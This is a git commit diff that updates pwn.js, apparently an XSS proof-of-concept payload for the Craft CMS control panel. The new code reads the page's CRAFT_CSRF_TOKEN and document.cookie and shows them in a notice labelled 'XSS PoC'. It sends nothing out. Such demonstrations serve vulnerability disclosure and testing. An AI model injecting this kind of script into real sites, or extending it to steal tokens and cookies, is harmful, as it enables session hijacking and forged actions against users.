a82780be347bafb65ec54886bc106a7184319f8f
Janpreet Singh <96124374+JanpreetWazir@users.noreply.github.com>
2025-11-25 22:45:56 +0530

    Update pwn.js

--- pwn.js
+++ pwn.js
@@ -1,25 +1,8 @@
-// 1. Check what JS can see (will be empty)
-var jsCookie = document.cookie;
+const token = document.querySelector("input[name='CRAFT_CSRF_TOKEN']")?.value || "";
 
-// 2. Check if any cookies exist in the browser (safe metadata check)
-var cookieCount = 0;
-var cookieNames = [];
-
-try {
-    // Try to read cookies via document.cookie (will not show HttpOnly)
-    jsCookie = document.cookie;
-
-    // Count cookies by reading document.cookie length
-    cookieCount = jsCookie ? jsCookie.split(";").length : 0;
-
-} catch (e) {
-    cookieCount = -1;
-}
-
-// 3. Show cookie visibility summary safely
 Craft.cp.displayNotice(
     "XSS PoC:<br>" +
-    "Visible cookies to JavaScript: " + jsCookie + "<br>" +
-    "HttpOnly cookies exist (not readable by JS).<br>" +
-    "Browser will still send them with requests."
+    "CSRF token length: " + token.length + "<br>" +
+    "Cookies visible to JS: \"" + document.cookie + "\" (should be empty)" + "<br>" +
+    "HttpOnly cookies are present and used for authentication."
 );
